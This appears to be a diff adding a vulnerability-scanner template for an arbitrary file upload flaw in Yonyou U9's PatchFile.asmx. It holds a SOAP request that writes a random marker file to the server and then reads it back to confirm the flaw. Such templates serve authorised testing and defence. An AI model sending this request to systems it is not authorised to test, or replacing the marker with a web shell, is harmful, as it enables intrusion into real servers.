@@ -1,0 +1,62 @@
+id: yongyou-u9-patchfile-asmx-anyfile-upload
+info:
+  name: Yonyou U9 PatchFile.asmx Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploit for Yonyou U9 PatchFile.asmx arbitrary file upload vulnerability, which allows attackers to upload any file to the server.
+
+variables:
+  t1: "{{rand_base(3)}}"
+  t2: "{{md5(t1)}}"
+  t3: "{{base64(t2)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/CS/Office/AutoUpdates/PatchFile.asmx"
+    headers:
+      Content-Type: text/xml; charset=utf-8
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+      <SaveFile xmlns="http://tempuri.org/">
+      <binData>{{t3}}</binData>
+      <path>./</path>
+      <fileName>{{t1}}.txt</fileName>
+      </SaveFile>
+      </soap:Body>
+      </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "true"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/CS/Office/AutoUpdates/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
